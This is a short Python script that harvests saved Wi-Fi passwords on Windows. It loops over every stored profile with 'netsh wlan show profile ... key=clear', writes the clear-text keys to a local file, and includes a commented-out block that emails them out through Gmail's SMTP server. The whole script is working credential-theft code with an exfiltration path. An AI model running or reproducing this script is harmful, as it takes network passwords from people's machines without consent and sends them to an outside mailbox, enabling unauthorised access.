#!/usr/bin/python

import subprocess, smtplib, re

# only works for windows systems
command1 = "netsh wlan show profile"
networks = subprocess.check_output(command1, shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

final_output = ""
for network in network_list:
    try:
        command2 = "netsh wlan show profile " + network + " key=clear"
        one_network_result = subprocess.check_output(command2, shell=True)
        #print(one_network_result)
        final_output += one_network_result
    except:
        #print("Could not get clear wifi password for: " + network)
        final_output += "Could not get clear wifi password for: " + network


print(final_output)
file = open("wifipasswords.txt", "w")
file.write(final_output)
file.close()


# remember you have to enable the gmail authorize settings
"""
my_email = "someemail@gmail.com"

server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login(my_email, password)
server.sendmail(my_email, my_email, final_output)
"""